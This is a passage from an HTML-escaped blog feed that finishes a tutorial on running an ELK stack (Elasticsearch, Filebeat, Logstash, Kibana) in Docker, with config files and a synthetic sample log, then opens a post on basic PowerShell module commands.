&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;output.elasticsearch&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;hosts&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;${ELASTIC_HOSTS}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;username&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;${ELASTIC_USER}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;password&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;${ELASTIC_PASSWORD}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;ssl.enabled&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;ssl.certificate_authorities&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;certs/ca/ca.crt&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;disable &lt;code&gt;filebeat.yml&lt;/code&gt; execution permission and restart container&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;bash&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;chmod go-w filebeat.yml
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker compose up&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

  &lt;figure class=&#34;left&#34;&gt;
    &lt;img src=&#34;http://localhost:1313/.gitbook/assets/Pasted%20image%2020241205131216.png&#34;   /&gt;
  &lt;/figure&gt;


&lt;h3 id=&#34;logstash&#34;&gt;
  Logstash
  &lt;a href=&#34;#logstash&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;
&lt;p&gt;Final container I&amp;rsquo;m going to setup is logstash which will help us to manage and transform logs.&lt;/p&gt;

&lt;h4 id=&#34;docker-composeyml-logstash01-container&#34;&gt;
  docker-compose.yml (&amp;rsquo;logstash01&amp;rsquo; container)
  &lt;a href=&#34;#docker-composeyml-logstash01-container&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h4&gt;
&lt;p&gt;Add the following to &lt;code&gt;docker-compose.yml&lt;/code&gt;&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;yml&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-yml&#34; data-lang=&#34;yml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;logstash01&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;depends_on&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#f92672&#34;&gt;es01&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       &lt;span style=&#34;color:#f92672&#34;&gt;condition&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;service_healthy&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#f92672&#34;&gt;kibana&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       &lt;span style=&#34;color:#f92672&#34;&gt;condition&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;service_healthy&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;image&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;docker.elastic.co/logstash/logstash:${STACK_VERSION}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;labels&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#f92672&#34;&gt;co.elastic.logs/module&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;logstash&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;user&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;root&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;volumes&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;certs:/usr/share/logstash/certs&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;logstashdata01:/usr/share/logstash/data&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./logstash_ingest_data/:/usr/share/logstash/ingest_data/&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./logstash.conf:/usr/share/logstash/pipeline/logstash.conf:ro&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;environment&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;xpack.monitoring.enabled=false&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;ELASTIC_USER=elastic&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;ELASTIC_PASSWORD=${ELASTIC_PASSWORD}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;ELASTIC_HOSTS=https://es01:9200&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&#34;logstashconf&#34;&gt;
  logstash.conf
  &lt;a href=&#34;#logstashconf&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h4&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;json&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;input&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;file&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;#https:&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//www.elastic.co/guide/en/logstash/current/plugins-inputs-file.html
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;   &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;#default&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;is&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;TAIL&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;which&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;assumes&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;more&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;data&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;will&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;come&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;into&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;the&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;file.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;#change&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;mode&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;read&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;the&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;file&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;is&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;compelte&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;file.&lt;/span&gt;  &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;by&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;default&lt;/span&gt;, &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;the&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;file&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;will&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;be&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;removed&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;once&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;reading&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;is&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;complete&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;--&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;backup&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;your&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;files&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;you&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;need&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;them.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;mode&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;tail&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;path&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/share/logstash/ingest_data/*&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;filter&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;output&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;elasticsearch&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;index&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;logstash-%{+YYYY.MM.dd}&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;hosts=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;${ELASTIC_HOSTS}&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;user=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;${ELASTIC_USER}&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;password=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;${ELASTIC_PASSWORD}&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;cacert=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;certs/ca/ca.crt&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Restart composer.&lt;/p&gt;

&lt;h4 id=&#34;note&#34;&gt;
  NOTE
  &lt;a href=&#34;#note&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h4&gt;
&lt;p&gt;Now, to actually see the logstash data index, you need to add sample log files in &lt;code&gt;logstash_ingest_data&lt;/code&gt; and &lt;code&gt;filebeat_ingest_data&lt;/code&gt; first.&lt;/p&gt;
&lt;p&gt;For that, I used &lt;a href=&#34;https://mockaroo.com/&#34;&gt;Mockaroo&lt;/a&gt; to create sample log file.&lt;/p&gt;
&lt;p&gt;Download and rename it from &lt;code&gt;.csv&lt;/code&gt; to &lt;code&gt;.log&lt;/code&gt; files.&lt;/p&gt;
&lt;p&gt;My mock data &lt;code&gt;test_log.log&lt;/code&gt; looks like the following&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;time,id,first_name,last_name,email,mac_address,ip_address,hash
4/17/2024,1,Rania,Cressey,rcressey0@reference.com,F9-E0-79-93-F6-DA,130.148.172.136,51ba1df5efb4de21b434d94d1e72615b57c30721
12/30/2023,2,Gerhard,Mewton,gmewton1@businessinsider.com,CA-36-6B-25-5B-16,187.64.188.232,9afff3f236157637cdf36f3a116b3f5d3ac3deb0
9/1/2024,3,Anabel,Musk,amusk2@opensource.org,FF-AB-36-D7-DA-E3,105.172.167.115,31f37d280ddf812083dbce74c9a0491b62bacfbd
4/29/2024,4,Mike,Stannas,mstannas3@jalbum.net,D0-B4-C0-DD-B0-00,70.70.51.36,4ed691e0ebd4c17dd2125a460bd92f6ca37cd095
8/1/2024,5,Tadd,Nurden,tnurden4@webmd.com,FA-EC-F3-2C-A4-4E,101.82.60.252,dc5e68d384de61e69fe0798deab41f65040cca56
6/12/2024,6,Neall,Vaulkhard,nvaulkhard5@ucsd.edu,36-78-C0-8B-4C-EF,47.129.241.26,456b8cfcc04155848d993790be677a374a910cb8
2/12/2024,7,Lilli,Linnane,llinnane6@blinklist.com,29-7E-61-0D-27-BA,196.177.55.60,d9c33fe2e9c21d31f88801402606d998c35f80dd
8/3/2024,8,Ianthe,Antognetti,iantognetti7@imdb.com,5E-F1-AF-90-E0-81,121.223.169.75,a17aa33138a84ee53283012338c9c1f0d9c324c9
9/9/2024,9,Piper,Victor,pvictor8@usatoday.com,0E-6D-6C-9B-43-1A,160.228.92.124,6e609309d997e6fa708cdcef0b11425c3bf84341&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Which I dropped in &lt;code&gt;logstash_ingest_data&lt;/code&gt;/ and &lt;code&gt;filebeat_ingest_data/&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Now it&amp;rsquo;ll take a few seconds for Elastic to see the changes in &lt;code&gt;Menu &amp;gt; Stack management &amp;gt; Index management &amp;gt; Reload Indices&lt;/code&gt;&lt;/p&gt;

  &lt;figure class=&#34;left&#34;&gt;
    &lt;img src=&#34;http://localhost:1313/.gitbook/assets/Pasted%20image%2020241210232627.png&#34;   /&gt;
  &lt;/figure&gt;

&lt;p&gt;And here should be logstash data logs.&lt;/p&gt;
&lt;p&gt;Now, to see the data, I need to create Data View for the &amp;ldquo;logstash- *&amp;rdquo; pattern.&lt;/p&gt;
&lt;p&gt;Go to: Menu &amp;gt; Analytics &amp;gt; Discover &amp;gt; Create data view&lt;/p&gt;

  &lt;figure class=&#34;left&#34;&gt;
    &lt;img src=&#34;http://localhost:1313/.gitbook/assets/Pasted%20image%2020241205132331.png&#34;   /&gt;
  &lt;/figure&gt;


  &lt;figure class=&#34;left&#34;&gt;
    &lt;img src=&#34;http://localhost:1313/.gitbook/assets/Pasted%20image%2020241210232040.png&#34;   /&gt;
  &lt;/figure&gt;


  &lt;figure class=&#34;left&#34;&gt;
    &lt;img src=&#34;http://localhost:1313/.gitbook/assets/Pasted%20image%2020241210232739.png&#34;   /&gt;
  &lt;/figure&gt;

&lt;p&gt;If you finished all the steps successfuly, you should see the following stack setup in the Stack Monitoring tab&lt;/p&gt;

  &lt;figure class=&#34;left&#34;&gt;
    &lt;img src=&#34;http://localhost:1313/.gitbook/assets/Pasted%20image%2020241219004800.png&#34;   /&gt;
  &lt;/figure&gt;


&lt;h2 id=&#34;conclusion&#34;&gt;
  Conclusion
  &lt;a href=&#34;#conclusion&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;In this article, I demonstrated how it is possible to set-up ELK Stack in its basic form.&lt;/p&gt;
&lt;p&gt;The files for this setup is uploaded on &lt;a href=&#34;https://github.com/grcheulishvili/ELK-stack-docker&#34;&gt;my github page&lt;/a&gt; for public availability.&lt;/p&gt;
&lt;p&gt;In the next part, I&amp;rsquo;ll look at more advanced configuration of Elastic.&lt;/p&gt;
&lt;p&gt;Until then.&lt;/p&gt;
</content>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/archive/learning-powershell/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>

      <guid>http://localhost:1313/archive/learning-powershell/</guid>
      <description>&lt;h1 id=&#34;0b---learning-powershell&#34;&gt;
  0b - Learning Powershell
  &lt;a href=&#34;#0b---learning-powershell&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;Getting available modules on the system&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;powershell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Get-Module -ListAvailable&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Getting only loaded modules on the system&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;powershell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Get-Module&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Loading Module on the system&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;powershell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Import-Module PowershellGet&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Getting available functions provided by modules&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;powershell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Get-Command -module &amp;lt;Module_Name&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Output:&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
